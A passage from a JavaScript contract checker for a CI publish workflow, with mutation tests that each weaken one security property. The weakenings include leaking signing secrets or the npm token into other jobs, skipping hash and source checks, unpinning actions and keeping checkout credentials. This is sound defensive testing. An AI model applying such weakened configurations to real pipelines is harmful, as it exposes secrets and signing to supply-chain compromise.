  const sealAt = packSteps.findIndex((s) => /node scripts\/ci\/publish\.mjs pack/.test(s.run ?? ""));
  check(packBuildAt >= 0 && packSteps.filter((s) => /publish\.mjs build/.test(s.run ?? "")).length === 1 && packBuildAt < sealAt, `pack must run exactly one "${PACK_BUILD_RUN}" step before it seals`);
  check(packBuildAt >= 0 && same(sorted(Object.keys(packSteps[packBuildAt].env ?? {})), ["PUBLISH_REGISTRY", "PUBLISH_UNITS"]) && packSteps[packBuildAt].env.PUBLISH_REGISTRY === PLAN_OUT("registry") && packSteps[packBuildAt].env.PUBLISH_UNITS === PLAN_OUT("units") && packSteps[packBuildAt].if?.trim() === NPM_STEP_IF, "the pack build step must take PUBLISH_REGISTRY and PUBLISH_UNITS from the plan and run only for npm");
  const wholeWorkspace = packSteps.filter((s) => /\bpnpm\b[^\n]*(?:\s-r\b|--recursive|--workspace-root)|\brun\s+build\b/.test(s.run ?? ""));
  check(wholeWorkspace.length === 0, `pack must not build the whole workspace (${wholeWorkspace.map((s) => s.name ?? s.run).join(", ")})`);

  // Hygiene on every job.
  for (const [jobName, job] of Object.entries(jobs)) {
    for (const step of stepsOf(job)) {
      if (step.uses) {
        check(/@[0-9a-f]{40}(?:\s|$)/.test(step.uses) || /@[0-9a-f]{40}$/.test(step.uses), `${jobName}: ${step.uses} must be pinned to a 40-hex commit`);
        if (/^actions\/checkout@/.test(step.uses)) check(step.with?.["persist-credentials"] === "false", `${jobName}: checkout must set persist-credentials: false`);
      }
      if (step.run !== undefined) check(!/\$\{\{/.test(step.run), `${jobName}: run text must not interpolate expressions; pass values through env`);
    }
  }
  if (problems.length) throw new Error(`${name} violates the publish contract:\n  - ${problems.join("\n  - ")}`);
  return true;
}

export function assertPublishWorkflow(text, name = "publish.yml") { return assertPublishDoc(parseYaml(text), name); }

const edit = (fn) => (doc) => { fn(doc.jobs, doc); };
const actionStep = (uses) => ({ name: "injected", uses });

/** Remove one `&&` operand from a job's condition (the condition must change, or the mutation is void). */
const withoutTerm = (condition, term) => {
  const next = condition.includes(`${term} && `) ? condition.replace(`${term} && `, "") : condition.replace(` && ${term}`, "");
  if (next === condition) throw new Error(`condition has no term ${term}`);
  return next;
};
const CONDITION_JOBS = [
  ["pack", ["!cancelled()", RESULT_OK("guard"), RESULT_OK("plan"), COUNT_TERM, SWAP_OK_OR_SKIPPED]],
  ["verify", ["!cancelled()", RESULT_OK("guard"), RESULT_OK("plan"), RESULT_OK("pack"), COUNT_TERM, CREDENTIALS_OK_OR_SKIPPED]],
  ["verify-linux", ["!cancelled()", RESULT_OK("guard"), RESULT_OK("plan"), RESULT_OK("pack"), COUNT_TERM, LINUX_COUNT_TERM]],
];
/** One mutation per operand of verify's, seal-check's and upload's conditions, plus weakened result checks. */
const CONDITION_MUTATIONS = [
  ...CONDITION_JOBS.flatMap(([job, terms]) => terms.map((term) => [`${job} condition drops ${term}`, edit((j) => { j[job].if = withoutTerm(j[job].if, term); })])),
  ...CONDITION_JOBS.flatMap(([job, terms]) => terms.filter((t) => /\.result == 'success'$/.test(t)).flatMap((term) => [
    [`${job} accepts a skipped ${term.split(".")[1]} job`, edit((j) => { j[job].if = j[job].if.replace(term, `(${term} || ${term.replace("'success'", "'skipped'")})`); })],
    [`${job} accepts a failed ${term.split(".")[1]} job`, edit((j) => { j[job].if = j[job].if.replace(term, term.replace("== 'success'", "!= 'cancelled'")); })],
  ])),
  // always() continues a cancelled workflow; only !cancelled() stops it. Each of the four conditions must use exactly that.
  ...CONDITION_JOBS.map(([job]) => [`${job} condition uses always() instead of !cancelled()`, edit((j) => { j[job].if = j[job].if.replace("!cancelled()", "always()"); })]),
  ...CONDITION_JOBS.map(([job]) => [`${job} condition uses success() instead of !cancelled()`, edit((j) => { j[job].if = j[job].if.replace("!cancelled()", "success()"); })]),
  ["pack accepts a failed sign-swap job", edit((j) => { j.pack.if = j.pack.if.replace("needs.sign-swap.result == 'skipped'", "needs.sign-swap.result != 'cancelled'"); })],
  ["pack has no condition", edit((j) => { delete j.pack.if; })],
  ["verify has no condition", edit((j) => { delete j.verify.if; })],
  ["verify's condition is the old implicit-success count test", edit((j) => { j.verify.if = "${{ needs.plan.outputs.count != '0' }}"; })],
  ["verify-linux has no condition", edit((j) => { delete j["verify-linux"].if; })],
  ["verify-linux's condition is the old implicit-success count test", edit((j) => { j["verify-linux"].if = "${{ needs.plan.outputs.linux_count != '0' }}"; })],
];

/** Linux verification mutations: a required Linux row must never be skippable, narrowable or counted without a receipt. */
const LINUX_MUTATIONS = [
  ["verify-linux is removed", edit((j) => { delete j["verify-linux"]; })],
  ["qualified stops needing verify-linux", edit((j) => { j.qualified.needs = j.qualified.needs.filter((n) => n !== "verify-linux"); })],
  ["qualified stops reading the verify-linux result", edit((j) => { delete j.qualified.steps[0].env.VERIFY_LINUX_RESULT; })],
  ["qualified drops the Linux result test", edit((j) => { j.qualified.steps[0].run = j.qualified.steps[0].run.replace('test "$VERIFY_LINUX_RESULT" = "$LINUX_EXPECTED_RESULT"\n', ""); })],
  ["qualified always expects Linux skipped", edit((j) => { j.qualified.steps[0].env.LINUX_EXPECTED_RESULT = "skipped"; })],
  ["qualified expects Linux skipped when required", edit((j) => { j.qualified.steps[0].env.LINUX_EXPECTED_RESULT = "${{ needs.plan.outputs.linux_count != '0' && 'skipped' || 'success' }}"; })],
  ["qualified reads another Linux count", edit((j) => { j.qualified.steps[0].env.LINUX_COUNT = "${{ needs.plan.outputs.count }}"; })],
  ["plan stops exposing linux_units", edit((j) => { delete j.plan.outputs.linux_units; })],
  ["plan stops exposing linux_count", edit((j) => { delete j.plan.outputs.linux_count; })],
  ["verify-linux runs on Windows", edit((j) => { j["verify-linux"]["runs-on"] = "windows-2025"; })],
  ["verify-linux becomes a matrix", edit((j) => { j["verify-linux"].strategy = { matrix: { os: ["ubuntu-24.04"] } }; })],
  ["verify-linux needs no pack", edit((j) => { j["verify-linux"].needs = j["verify-linux"].needs.filter((n) => n !== "pack"); })],
  ["verify-linux continues on error", edit((j) => { j["verify-linux"]["continue-on-error"] = "true"; })],
  ["verify-linux step continues on error", edit((j) => { j["verify-linux"].steps.find((s) => /publish\.mjs verify/.test(s.run ?? ""))["continue-on-error"] = "true"; })],
  ["verify-linux gates every unit, not the Linux-required ones", edit((j) => { const s = j["verify-linux"].steps.find((x) => /gate\.mjs/.test(x.run ?? "")); s.run = s.run.replace("$PUBLISH_LINUX_UNITS", "$PUBLISH_UNITS"); })],
  ["verify-linux gate gains an allowance", edit((j) => { const s = j["verify-linux"].steps.find((x) => /gate\.mjs/.test(x.run ?? "")); s.run = `${s.run.trim()} --allow-no-test "$PUBLISH_LINUX_UNITS"`; })],
  ["verify-linux gate reads another unit list", edit((j) => { j["verify-linux"].steps.find((x) => /gate\.mjs/.test(x.run ?? "")).env.PUBLISH_LINUX_UNITS = PLAN_OUT("units"); })],
  ["verify-linux gate is conditional", edit((j) => { j["verify-linux"].steps.find((x) => /gate\.mjs/.test(x.run ?? "")).if = "${{ needs.plan.outputs.registry == 'npm' }}"; })],
  ["verify-linux skips the unit gate", edit((j) => { j["verify-linux"].steps = j["verify-linux"].steps.filter((s) => !/gate\.mjs/.test(s.run ?? "")); })],
  ["verify-linux skips the receipt", edit((j) => { j["verify-linux"].steps = j["verify-linux"].steps.filter((s) => !/publish\.mjs verify/.test(s.run ?? "")); })],
  ["verify-linux receipt is written before the gate", edit((j) => { const steps = j["verify-linux"].steps; const i = steps.findIndex((s) => /publish\.mjs verify/.test(s.run ?? "")); const [x] = steps.splice(i, 1); steps.splice(steps.findIndex((s) => /gate\.mjs/.test(s.run ?? "")), 0, x); })],
  ["verify-linux receipt is conditional", edit((j) => { j["verify-linux"].steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).if = "${{ needs.plan.outputs.registry == 'npm' }}"; })],
  ["verify-linux receipt loses the Linux unit list", edit((j) => { delete j["verify-linux"].steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.PUBLISH_LINUX_UNITS; })],
  ["verify-linux receipt loses its managed Chrome root", edit((j) => { delete j["verify-linux"].steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.RIGHTKIT_CHROME_FOR_TESTING_ROOT; })],
  ["verify-linux receipt uses another Chrome root", edit((j) => { j["verify-linux"].steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.RIGHTKIT_CHROME_FOR_TESTING_ROOT = `${RT}/other-chrome`; })],
  ["verify-linux receipt gains arbitrary env", edit((j) => { j["verify-linux"].steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.EXTRA = "arbitrary"; })],
  ["verify-linux receipt loses an allowance record", edit((j) => { delete j["verify-linux"].steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.PUBLISH_ALLOW_NO_TEST; })],
  ["verify-linux receipt artifact is lost", edit((j) => { j["verify-linux"].steps = j["verify-linux"].steps.filter((s) => s.with?.name !== `publish-receipt-verify-${LINUX_HOST_LABEL}`); })],
  ["verify-linux receipt artifact is optional", edit((j) => { j["verify-linux"].steps.find((s) => s.with?.name === `publish-receipt-verify-${LINUX_HOST_LABEL}`).with["if-no-files-found"] = "ignore"; })],
  ["verify-linux receipt artifact is conditional", edit((j) => { j["verify-linux"].steps.find((s) => s.with?.name === `publish-receipt-verify-${LINUX_HOST_LABEL}`).if = "${{ success() }}"; })],
  ["verify-linux receipt retention shortens", edit((j) => { j["verify-linux"].steps.find((s) => s.with?.name === `publish-receipt-verify-${LINUX_HOST_LABEL}`).with["retention-days"] = "7"; })],
  ["verify-linux receipt is named for another host", edit((j) => { j["verify-linux"].steps.find((s) => s.with?.name === `publish-receipt-verify-${LINUX_HOST_LABEL}`).with.name = "publish-receipt-verify-xcode-27"; })],
  ["verify-linux evidence retention shortens", edit((j) => { j["verify-linux"].steps.find((s) => s.with?.name === `publish-verify-${LINUX_HOST_LABEL}-\${{ github.run_attempt }}`).with["retention-days"] = "7"; })],
  ["verify-linux Chrome cache drops qa-chrome coverage", edit((j) => { const s = j["verify-linux"].steps.find((x) => x.name === "Cache the pinned Chrome for Testing"); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.linux_units), ' @rightkit/qa-chrome ')", ""); })],
  ["verify-linux Chrome provision drops qa-chrome coverage", edit((j) => { const s = j["verify-linux"].steps.find((x) => /provision-chrome\.mjs/.test(x.run ?? "")); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.linux_units), ' @rightkit/qa-chrome ')", ""); })],
  ["verify-linux Chrome provision tests the full unit list", edit((j) => { const s = j["verify-linux"].steps.find((x) => /provision-chrome\.mjs/.test(x.run ?? "")); s.if = s.if.replaceAll("linux_units", "units"); })],
  ["verify-linux Chrome pin is told it is a dry run", edit((j) => { j["verify-linux"].steps.find((x) => /provision-chrome\.mjs/.test(x.run ?? "")).env.PUBLISH_DRY_RUN = "true"; })],
  ["verify-linux reads a secret", edit((j) => { j["verify-linux"].steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.CARGO_REGISTRY_TOKEN = "${{ secrets.CARGO_REGISTRY_TOKEN }}"; })],
  ["verify-linux requests id-token", edit((j) => { j["verify-linux"].permissions = { contents: "read", "id-token": "write" }; })],
  ["verify-linux joins an environment", edit((j) => { j["verify-linux"].environment = "release"; })],
  ["verify-linux has no timeout", edit((j) => { delete j["verify-linux"]["timeout-minutes"]; })],
  ["verify-linux uses an unpinned action", edit((j) => { j["verify-linux"].steps[0].uses = "actions/checkout@v7"; })],
  ["verify-linux checkout keeps credentials", edit((j) => { j["verify-linux"].steps[0].with["persist-credentials"] = "true"; })],
  ["verify-linux stops downloading the sealed bytes", edit((j) => { j["verify-linux"].steps = j["verify-linux"].steps.filter((s) => s.with?.name !== "publish-packed"); })],
];

/** Each mutation breaks exactly one property; the contract must reject every one. */
const winStep = (j, i) => j.verify.steps.find((s) => s.name === WIN_OPENSSL_STEPS[i][0]);
export const MUTATIONS = [
  ["Windows OpenSSL locate step is removed", edit((j) => { j.verify.steps = j.verify.steps.filter((s) => s.name !== WIN_OPENSSL_STEPS[1][0]); })],
  ["Windows Perl select step is removed", edit((j) => { j.verify.steps = j.verify.steps.filter((s) => s.name !== WIN_OPENSSL_STEPS[0][0]); })],
  ["Windows OpenSSL locate step runs for npm too", edit((j) => { winStep(j, 1).if = "${{ runner.os == 'Windows' }}"; })],
  ["Windows OpenSSL locate step runs on every host", edit((j) => { winStep(j, 1).if = "${{ needs.plan.outputs.registry == 'crates' }}"; })],
  ["Windows Perl select step runs on every host", edit((j) => { winStep(j, 0).if = "${{ needs.plan.outputs.registry == 'crates' }}"; })],
  ["Windows OpenSSL locate step runs inline code", edit((j) => { winStep(j, 1).run = "echo OPENSSL_DIR=x >> $env:GITHUB_ENV"; })],
  ["Windows OpenSSL locate step runs another script", edit((j) => { winStep(j, 1).run = '& "$env:GITHUB_WORKSPACE/scripts/ci/other.ps1"'; })],
  ["Windows OpenSSL locate step gains env", edit((j) => { winStep(j, 1).env = { OPENSSL_DIR: "${{ inputs.units }}" }; })],
  ["Windows OpenSSL locate step changes shell", edit((j) => { winStep(j, 1).shell = "bash"; })],
  ["Windows OpenSSL steps move after the gate", edit((j) => { const moved = j.verify.steps.filter((s) => WIN_OPENSSL_STEPS.some(([n]) => n === s.name)); j.verify.steps = j.verify.steps.filter((s) => !moved.includes(s)); const g = j.verify.steps.findIndex((s) => /gate\.mjs/.test(s.run ?? "")); j.verify.steps.splice(g + 1, 0, ...moved); })],
  ["Windows OpenSSL steps run in the wrong order", edit((j) => { const a = j.verify.steps.indexOf(winStep(j, 0)); const b = j.verify.steps.indexOf(winStep(j, 1)); [j.verify.steps[a], j.verify.steps[b]] = [j.verify.steps[b], j.verify.steps[a]]; })],
  ["verify gains another PowerShell step", edit((j) => { j.verify.steps.splice(-3, 0, { name: "extra", shell: "pwsh", run: "echo extra" }); })],
  ["FS setup regains substring unit matching", edit(j => { const s = j.verify.steps.find(s => s.run?.includes("node scripts/ci/fs-native-fixtures.mjs setup")); s.if = s.if.replace("contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-fs ')", "contains(needs.plan.outputs.units, 'rightkit-fs')"); })],
  ["FS cleanup regains substring unit matching", edit(j => { const s = j.verify.steps.find(s => s.run?.trim() === "node scripts/ci/fs-native-fixtures.mjs cleanup"); s.if = s.if.replace("contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-fs ')", "contains(needs.plan.outputs.units, 'rightkit-fs')"); })],
  ["Chrome cache drops qa-chrome coverage", edit(j => { const s = j.verify.steps.find(s => s.name === "Cache the pinned Chrome for Testing"); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/qa-chrome ')", ""); })],
  ["Chrome provision drops qa-chrome coverage", edit(j => { const s = j.verify.steps.find(s => /provision-chrome\.mjs/.test(s.run ?? "")); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/qa-chrome ')", ""); })],
  ["FS verification loses mounted fixture setup", edit(j => { j.verify.steps = j.verify.steps.filter(s => !s.run?.includes("node scripts/ci/fs-native-fixtures.mjs setup")); })],
  ["FS cleanup skips failed verification", edit(j => { j.verify.steps.find(s => s.run?.trim() === "node scripts/ci/fs-native-fixtures.mjs cleanup").if = "${{ success() }}"; })],
  ["FS gate uses scratch instead of distinct mounted volume", edit(j => { const s = j.verify.steps.find(s => s.run?.includes("node scripts/ci/fs-native-fixtures.mjs setup")); s.run = s.run.replace("${plan.other}", "${plan.scratch}"); })],
  ["signer permits unexpected artifact entries", edit((j) => { j["sign-swap"].steps[1].run = j["sign-swap"].steps[1].run.replace('test "${#files[@]}" -eq 3', 'true'); })],
  ["signer permits artifact symlinks", edit((j) => { j["sign-swap"].steps[1].run = j["sign-swap"].steps[1].run.replace('  test ! -L "$in/$file"', '  true'); })],
  ["pack loses unsigned build dependency", edit((j) => { j.pack.needs = j.pack.needs.filter((n) => n !== "build-swap"); })],
  ["pack admits skipped signer for required helper", edit((j) => { j.pack.if = j.pack.if.replace("needs.sign-swap.result == 'success'", "(needs.sign-swap.result == 'success' || needs.sign-swap.result == 'skipped')"); })],
  ["signer substitutes source workflow in receipt", edit((j) => { j["sign-swap"].steps[1].run = j["sign-swap"].steps[1].run.replace('"$GITHUB_WORKFLOW_REF"', '"foreign"'); })],
  ["signer substitutes source attempt in receipt", edit((j) => { j["sign-swap"].steps[1].run = j["sign-swap"].steps[1].run.replace('"$GITHUB_RUN_ATTEMPT"', '"1"'); })],
  ["build-swap joins signing environment", edit((j) => { j["build-swap"].environment = "release"; })],
  ["build-swap requests OIDC", edit((j) => { j["build-swap"].permissions["id-token"] = "write"; })],
  ["build-swap loses source receipt", edit((j) => { j["build-swap"].steps[3].run = "echo sealed"; })],
  ["build-swap substitutes sealed hash output", edit((j) => { j["build-swap"].outputs.sha256 = "literal"; })],
  ["signer checks out package code", edit((j) => { j["sign-swap"].steps.splice(0, 0, { uses: "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", with: { "persist-credentials": "false" } }); })],
  ["signer takes unsigned artifact from foreign run", edit((j) => { j["sign-swap"].steps[0].with["run-id"] = "1"; })],
  ["signer takes different unsigned artifact", edit((j) => { j["sign-swap"].steps[0].with.name = "other"; })],
  ["signer omits unsigned hash validation", edit((j) => { j["sign-swap"].steps[1].run = j["sign-swap"].steps[1].run.replace('(cd "$in" && shasum -a 256 -c rightkit-swap.sha256)', 'true'); })],
  ["signer omits source run validation", edit((j) => { j["sign-swap"].steps[1].run = j["sign-swap"].steps[1].run.replace('cmp "$RUNNER_TEMP/expected-swap-receipt.txt" "$in/source-receipt.txt"', 'true'); })],
  ["signer admits arbitrary unsigned hash", edit((j) => { j["sign-swap"].steps[1].env.EXPECTED_SHA256 = "literal"; })],
  ["signer reads secrets before validation", edit((j) => { [j["sign-swap"].steps[1], j["sign-swap"].steps[2]] = [j["sign-swap"].steps[2], j["sign-swap"].steps[1]]; })],
  ["signer validation may skip", edit((j) => { j["sign-swap"].steps[1].if = "${{ false }}"; })],
  ["signer loses build dependency", edit((j) => { j["sign-swap"].needs = ["guard", "plan"]; })],
  ["signer installs dependencies", edit((j) => { j["sign-swap"].steps[3].run += "\npnpm install"; })],
  ["build-credentials-helper is removed", edit((j) => { delete j["build-credentials-helper"]; })],
  ["sign-credentials-helper is removed", edit((j) => { delete j["sign-credentials-helper"]; })],
  ["verify no longer needs sign-credentials-helper", edit((j) => { j.verify.needs = j.verify.needs.filter((n) => n !== "sign-credentials-helper"); })],
  ["verify no longer needs build-credentials-helper", edit((j) => { j.verify.needs = j.verify.needs.filter((n) => n !== "build-credentials-helper"); })],
  ["verify runs after a failed sign-credentials-helper", edit((j) => { j.verify.if = withoutTerm(j.verify.if, CREDENTIALS_OK_OR_SKIPPED); })],
  ["verify admits a skipped credentials signer for a required helper", edit((j) => { j.verify.if = j.verify.if.replace("needs.sign-credentials-helper.result == 'success'", "(needs.sign-credentials-helper.result == 'success' || needs.sign-credentials-helper.result == 'skipped')"); })],
  ["sign-credentials-helper runs for npm runs too", edit((j) => { j["sign-credentials-helper"].if = "${{ needs.plan.outputs.count != '0' }}"; })],
  ["sign-credentials-helper runs for any crates run", edit((j) => { j["sign-credentials-helper"].if = j["sign-credentials-helper"].if.replace(" && contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-credentials ')", ""); })],
  ["sign-credentials-helper loses its environment", edit((j) => { delete j["sign-credentials-helper"].environment; })],
  ["verify joins the release environment", edit((j) => { j.verify.environment = "release"; })],
  ["sign-credentials-helper reads the npm token", edit((j) => { j["sign-credentials-helper"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).env.NODE_AUTH_TOKEN = "${{ secrets.NPM_TOKEN }}"; })],
  ["sign-credentials-helper reads a secret in a second step", edit((j) => { j["sign-credentials-helper"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.X = "${{ secrets.APPLE_KEYCHAIN_PASSWORD }}"; })],
  ["the credentials profile secret leaks into pack", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), APPLE_CREDENTIALS_QUAL_PROFILE_BASE64: "${{ secrets.APPLE_CREDENTIALS_QUAL_PROFILE_BASE64 }}" }; })],
  ["the credentials profile secret leaks into verify", edit((j) => { j.verify.steps.at(-3).env = { ...(j.verify.steps.at(-3).env ?? {}), APPLE_CREDENTIALS_QUAL_PROFILE_BASE64: "${{ secrets.APPLE_CREDENTIALS_QUAL_PROFILE_BASE64 }}" }; })],
  ["the credentials build step gets a secret", edit((j) => { j["build-credentials-helper"].steps.find((s) => /git show /.test(s.run ?? "")).env = { T: "${{ secrets.APPLE_CERTIFICATE_PASSWORD }}" }; })],
  ["build-credentials-helper joins the signing environment", edit((j) => { j["build-credentials-helper"].environment = "release"; })],
  ["build-credentials-helper requests OIDC", edit((j) => { j["build-credentials-helper"].permissions["id-token"] = "write"; })],
  ["build-credentials-helper loses its sealed checkout history", edit((j) => { delete j["build-credentials-helper"].steps[0].with["fetch-depth"]; })],
  ["build-credentials-helper substitutes pinned sources", edit((j) => { j["build-credentials-helper"].steps[1].run = j["build-credentials-helper"].steps[1].run.replace(`commit="${CREDENTIALS_HELPER_SOURCE_COMMIT}"`, 'commit="other"'); })],
  ["build-credentials-helper skips blob verification", edit((j) => { j["build-credentials-helper"].steps[1].run = j["build-credentials-helper"].steps[1].run.replace('test "$(git hash-object "$stage/source/AppleCredentialHelperHost.swift")" = "e9f6aff167f9219eab465fa4d87f9bcc992bee07"', "true"); })],
  ["credentials signer rebuilds after receiving secrets", edit((j) => { j["sign-credentials-helper"].steps.splice(3, 0, { run: "swiftc main.swift" }); })],
  ["credentials signer installs dependencies", edit((j) => { j["sign-credentials-helper"].steps[3].run += "\npnpm install"; })],
  ["credentials signer checks out package code", edit((j) => { j["sign-credentials-helper"].steps.splice(0, 0, { uses: "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", with: { "persist-credentials": "false" } }); })],
  ["credentials signer takes unsigned artifact from foreign run", edit((j) => { j["sign-credentials-helper"].steps[0].with["run-id"] = "1"; })],
  ["credentials signer takes different unsigned artifact", edit((j) => { j["sign-credentials-helper"].steps[0].with.name = "other"; })],
  ["credentials signer omits unsigned hash validation", edit((j) => { j["sign-credentials-helper"].steps[1].run = j["sign-credentials-helper"].steps[1].run.replace('(cd "$in/RightKitCredentialsQualification.app/Contents/MacOS" && shasum -a 256 -c "$in/helper.sha256")', "true"); })],
  ["credentials signer omits source run validation", edit((j) => { j["sign-credentials-helper"].steps[1].run = j["sign-credentials-helper"].steps[1].run.replace('cmp "$RUNNER_TEMP/expected-credentials-helper-receipt.txt" "$in/source-receipt.txt"', "true"); })],
  ["credentials signer admits a smuggled profile in the unsigned app", edit((j) => { j["sign-credentials-helper"].steps[1].run = j["sign-credentials-helper"].steps[1].run.replace('test ! -e "$in/RightKitCredentialsQualification.app/Contents/embedded.provisionprofile"', "true"); })],
  ["credentials signer admits arbitrary unsigned hash", edit((j) => { j["sign-credentials-helper"].steps[1].env.EXPECTED_SHA256 = "literal"; })],
  ["credentials signer reads secrets before validation", edit((j) => { [j["sign-credentials-helper"].steps[1], j["sign-credentials-helper"].steps[2]] = [j["sign-credentials-helper"].steps[2], j["sign-credentials-helper"].steps[1]]; })],
  ["credentials signer skips profile validation", edit((j) => { j["sign-credentials-helper"].steps[3].run = j["sign-credentials-helper"].steps[3].run.replace("python3 - \"$profile\" \"$identity_hash\" <<'PY'", "true"); })],
  ["credentials signer drops the hardened runtime", edit((j) => { const s = j["sign-credentials-helper"].steps.find((x) => /codesign --force/.test(x.run ?? "")); s.run = s.run.replace(" --options runtime", ""); })],
  ["credentials signer uses another identity", edit((j) => { j["sign-credentials-helper"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.APPLE_DEVELOPER_ID = "-"; })],
  ["credentials signer drops the sole-group check", edit((j) => { const s = j["sign-credentials-helper"].steps.find((x) => /codesign --force/.test(x.run ?? "")); s.run = s.run.replace('if entitlements != {"keychain-access-groups": ["6KLGD3LLKF.org.rightkit.qualification.credentials"]}:', "if False:"); })],
  ["credentials signer keeps the keychain and profile", edit((j) => { j["sign-credentials-helper"].steps = j["sign-credentials-helper"].steps.filter((s) => !/security delete-keychain/.test(s.run ?? "")); })],
  ["credentials signer hands over another path", edit((j) => { j["sign-credentials-helper"].steps.find((s) => /upload-artifact/.test(s.uses ?? "")).with.path = "target"; })],
  ["credentials signer loses its build dependency", edit((j) => { j["sign-credentials-helper"].needs = ["guard", "plan"]; })],
  ["verify downloads the credentials helper unconditionally", edit((j) => { delete j.verify.steps.find((s) => s.with?.name === SIGN_CREDENTIALS_ARTIFACT).if; })],
  ["verify provisions the helper route unconditionally", edit((j) => { delete j.verify.steps.find((s) => /provision-credentials-helper-env/.test(s.run ?? "")).if; })],
  ["verify provisions the helper route on every host", edit((j) => { const s = j.verify.steps.find((x) => /provision-credentials-helper-env/.test(x.run ?? "")); s.if = s.if.replace(" && runner.os == 'macOS'", ""); })],
  ["verify gate takes a literal helper app", edit((j) => { j.verify.steps.find((s) => /gate\.mjs --registry/.test(s.run ?? "")).env.RK_SOURCE_HELPER_APP = "/tmp/other.app"; })],
  ["verify receipt loses the helper team", edit((j) => { delete j.verify.steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.RK_CONSUMER_HELPER_TEAM_ID; })],
  ["qualification drops final result gate", edit((j) => { delete j.qualified; })],
  ["qualification final gate can skip", edit((j) => { delete j.qualified.if; })],
  ["qualification final gate accepts skipped verify", edit((j) => { j.qualified.steps[0].run = j.qualified.steps[0].run.replace('test "$VERIFY_RESULT" = success', 'true'); })],
  ["qualification final gate loses verify dependency", edit((j) => { j.qualified.needs = j.qualified.needs.filter((n) => n !== "verify"); })],
  ["qualification cancels an in-progress run", edit((_, d) => { d.concurrency["cancel-in-progress"] = "true"; })],
  ["pack shortens archive retention", edit((j) => { j.pack.steps.find((s) => s.with?.name === "publish-packed").with["retention-days"] = "7"; })],
  ["verify shortens receipt retention", edit((j) => { j.verify.steps.find((s) => s.with?.name === "publish-receipt-verify-${{ matrix.os }}").with["retention-days"] = "7"; })],
  ["sign-swap shortens helper retention", edit((j) => { j["sign-swap"].steps.find((s) => s.with?.name === SIGN_SWAP_ARTIFACT).with["retention-days"] = "7"; })],
  ["verify shortens evidence retention", edit((j) => { j.verify.steps.find((s) => s.with?.name === "publish-verify-${{ matrix.os }}-${{ github.run_attempt }}").with["retention-days"] = "7"; })],
  ["qualification loses independent concurrency", edit((_, d) => { d.concurrency.group = "publish"; })],
  ["qualification regains dry-run dispatch", edit((_, d) => { d.on.workflow_dispatch.inputs.dry_run = { type: "boolean", default: "true" }; })],
  ["qualification regains upload", edit((j) => { j.upload = { "runs-on": "ubuntu-24.04", steps: [] }; })],
  ["qualification regains approval before pack", edit((j) => { j.pack.steps.push({ run: "node scripts/ci/upload.mjs run --dry-run" }); })],
  ["qualification packs twice", edit((j) => { j.pack.steps.push({ ...j.pack.steps.find((s) => s.run?.trim() === "node scripts/ci/publish.mjs pack") }); })],
  ["verify loses native receipt artifact", edit((j) => { j.verify.steps = j.verify.steps.filter((s) => s.with?.name !== "publish-receipt-verify-${{ matrix.os }}"); })],
  ["qualification planning permits unpinned assets", edit((j) => { j.plan.steps.find((s) => s.run?.trim() === "node scripts/ci/publish.mjs plan").env.PUBLISH_DRY_RUN = "true"; })],
  ["Chrome cache drops React-shell coverage", edit((j) => { const s = j.verify.steps.find((x) => x.name === "Cache the pinned Chrome for Testing"); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/react-shell ')", ""); })],
  ["Chrome provision drops React-shell coverage", edit((j) => { const s = j.verify.steps.find((x) => /provision-chrome\.mjs/.test(x.run ?? "")); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/react-shell ')", ""); })],
  ["Chrome cache drops settings-ui coverage", edit((j) => { const s = j.verify.steps.find((x) => x.name === "Cache the pinned Chrome for Testing"); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/settings-ui ')", ""); })],
  ["Chrome provision drops settings-ui coverage", edit((j) => { const s = j.verify.steps.find((x) => /provision-chrome\.mjs/.test(x.run ?? "")); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/settings-ui ')", ""); })],
  ["Chrome cache drops onboarding coverage", edit((j) => { const s = j.verify.steps.find((x) => x.name === "Cache the pinned Chrome for Testing"); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/onboarding ')", ""); })],
  ["Chrome provision drops onboarding coverage", edit((j) => { const s = j.verify.steps.find((x) => /provision-chrome\.mjs/.test(x.run ?? "")); s.if = s.if.replace(" || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/onboarding ')", ""); })],
  ["drop the Windows verify host", edit((j) => { j.verify.strategy.matrix.os = ["xcode-27"]; })],
  ["drop the macOS verify host", edit((j) => { j.verify.strategy.matrix.os = ["windows-2025"]; })],
  ["exclude a verify leg", edit((j) => { j.verify.strategy.matrix.exclude = [{ os: "windows-2025" }]; })],
  ["continue-on-error on a job", edit((j) => { j.verify["continue-on-error"] = "true"; })],
  ["continue-on-error on a step", edit((j) => { j.verify.steps[0]["continue-on-error"] = "true"; })],
  ["guard allows another branch", edit((j) => { j.guard.steps[0].run = j.guard.steps[0].run.replace('"$REF" != "refs/heads/main"', '"$REF" != "refs/heads/dev"'); })],
  ["guard accepts a private repository", edit((j) => { j.guard.steps[0].run = j.guard.steps[0].run.replace('"$PRIVATE" != "false"', '"$PRIVATE" != "maybe"'); })],
